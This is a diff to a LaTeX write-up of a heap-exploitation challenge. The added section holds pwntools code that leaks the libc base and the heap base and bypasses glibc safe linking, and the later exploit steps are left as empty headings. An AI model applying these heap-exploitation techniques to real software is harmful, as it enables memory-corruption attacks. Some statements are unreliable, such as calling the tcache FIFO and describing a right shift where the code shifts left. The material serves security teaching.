@@ -574,12 +574,83 @@ To understand the mitigations the pwntools library help us, in fact there is a f
     Obviously, since we cannot change the size inside the memory we have the possibility of reading sixteen more characters inside the heap, allowing the attacker to perform a heap overflow.\newline
     The other functions such as createNote, deleteNote and viewNote seem to be implemented correctly without bugs, for this reason I decided not to show them.
     \subsection{Exploit Development and Testing}
-    \paragraph{leak libc base and safe link bypass}
-    \paragraph{leak heap base}
+    In this section we will talk about how to exploit a buffer overflow with chunk creation, edit chunk, view chunk, delete chunk primitives.\newline
+    The first thing I did is create the exploit.py file and import pwntools, a library that allows me to send and receive bytes from the program, the code follows.
+    \begin{verbatim}
+    def malloc(size,index):
+        io.sendline(b"1")
+        io.sendlineafter(b"index:",str(index).encode())
+        io.sendlineafter(b"size:",str(size).encode())
+    def edit(index,content):
+        io.sendline(b"2")
+        io.sendlineafter(b"Index:",str(index).encode())
+        io.sendafter(b"content:",content)
+    def view(index):
+        io.sendline(b"3")
+        io.sendlineafter(b"Index:",str(index).encode())
+    def delete(index):
+        io.sendline(b"4")
+        io.sendlineafter(b"Index:",str(index).encode())
+    \end{verbatim}
+    In the code above we can see two functions implemented by the pwntools library, both will send the input as bytes but sendlineafter allows you to do this after a string that the output generates.\newline
+    \paragraph{leak libc base}
+    the first step is to leak the libc base \newline
+    There is a trick that allows you to leak the libc, which consists in allocating a chunk of very large size that is not freed in the tcache, in fact if we perform a free of a chunk that does not end up in the tcache (size greater than 0x408) we will have the fd field of our chunk pointing to libc.\newline
+    If we are going to free an unsortedbin this will point to a pointer of the main arena, which will contain a pointer to libc.\newline
+    The main arena is a structure that has the task of managing the heap, saving values such as top chunk, last reminder, heap start and heap and many other fields.\newline
+    \clearpage
+    Below is the code that allows us to leak libc base and bypass safe linking.\newline
+
+    \begin{verbatim}     
+    malloc(0x500,0)
+    malloc(0x60,1)
+    delete(0)
+    pause()
+    malloc(0x500,0)
+    view(0)
+    io.recvuntil("note : ")
+    libc_addr=u64(io.recvline(False).ljust(8,b"\x00"))
+    libc_addr=libc_addr-0x21ace0
+    libc.address=libc_addr
+    \end{verbatim}
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=1\linewidth]{leak_libc_heap_chall.png}
+        \caption{Leak libc}
+        \label{fig:enter-label}
+    \end{figure}
+    As you can see at address 0x55671813e2c0 we have a pointer to libc, at this point we just need to reallocate chunk of the same size and view it, malloc will not clean the contents of the freed chunk allowing us to leak a pointer to libc. \newline
+    \paragraph{leak heap base and safe linking bypass}
+    As regards heap leak, the same technique used previously is used but with the difference that the victim chunk will be of a size that allows us to insert it into the tcache after it is freed.\newline
+    In fact, the tcache creates a FIFO list of freed chunks for each chunk size which will be incremented by 0x10.\newline
+    the code follows:
+    \begin{verbatim}
+    #lek heap and safe linking
+    malloc(0x90,2)
+    delete(2)
+    malloc(0x90,2)
+    view(2)
+    io.recvuntil("note : ")
+    key=u64(io.recvline(False).ljust(8,b"\x00"))
+    heap_base = key<<12
+    success(f"SAFE LINKING KEY LEAK@: {hex(key)} ")
+    success(f"HEAP BASE LEAK@: {hex(heap_base)} ")
+    delete(1)
+    delete(2)
+    \end{verbatim}
+    As you can see, we allocate a chunk of size 0x90 and make this free, after we reallocate it we will have a heap leak.\newline
+    As regards the safe link bypass, the leak that we will generate will be the key that we will need to bypass the mitigation, in fact by performing an xor operation between the key and the pointer on the heap any address on the heap will bypass safe linking.\newline
+    Finally, by shifting the key to the right we will have the base of the heap.
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=1\linewidth]{leak_heap_heap_chall.png}
+        \caption{heap leak}
+        \label{fig:enter-label}
+    \end{figure}
     \paragraph{craft arbitrary read and leak environ}
     \paragraph{craft arbitrary write and rewrite return address}
-    \paragraph{remote command execution}
-
+    \paragraph{profit}
+   
     \clearpage
     \section{exploit analisys}
     to be continued
@@ -601,7 +672,8 @@ To understand the mitigations the pwntools library help us, in fact there is a f
     \section{online references}
     \href{https://it.wikipedia.org/wiki/Home_page}{wikipedia}\newline
     \href{https://it.wikipedia.org/wiki/Home_page}{Heap Lab course}\newline
-    \href{https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation}{Safe Linking blog}\newline
+    \href{https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation}{SafeLinkingblog}\newline 
+    \href{https://docs.pwntools.com/en/stable/}{Python library pwntools}\newline\
     \href{https://elixir.bootlin.com/}{Linux kernel/Glibc source}\newline
     \clearpage
 \end{document}
